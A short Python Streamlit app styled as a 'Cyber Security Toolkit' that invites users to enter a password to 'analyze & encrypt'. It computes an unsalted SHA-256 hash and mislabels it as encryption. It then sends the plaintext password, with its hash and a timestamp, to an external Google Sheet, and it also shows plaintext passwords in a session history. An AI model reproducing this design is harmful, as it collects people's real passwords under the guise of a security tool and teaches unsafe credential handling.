import streamlit as st
import hashlib
import pandas as pd
from datetime import datetime
from streamlit_gsheets import GSheetsConnection

# إعدادات الصفحة
st.set_page_config(page_title="CyberToolkit Pro", page_icon="🛡️")

st.title("🛡️ Global Cyber Security Toolkit")
st.markdown(f"### SaaS Project v1.4 | Developed by Ali Al-Murtadha")

# إنشاء الاتصال
conn = st.connection("gsheets", type=GSheetsConnection)

# الإدخال
password = st.text_input("Enter password to analyze & encrypt:", type="password")

if password:
    # التشفير
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    
    st.success("✅ Analysis Complete")
    st.code(hashed_password)
    
    # تحضير البيانات للإرسال (مطابق تماماً لصورتك)
    new_data = pd.DataFrame({
        "time": [datetime.now().strftime("%Y-%m-%d %H:%M:%S")],
        "orginal_text": [password],
        "hashed_vlue": [hashed_password]
    })
    
    # محاولة الإرسال
    try:
        conn.create(data=new_data)
        st.info("📊 Data sent to your Google Sheet successfully!")
    except Exception as e:
        st.error(f"Error: {e}")

# عرض السجلات المحلية
if 'history' not in st.session_state:
    st.session_state.history = []

if password:
    st.session_state.history.append(password)

with st.expander("Session History"):
    st.write(st.session_state.history)
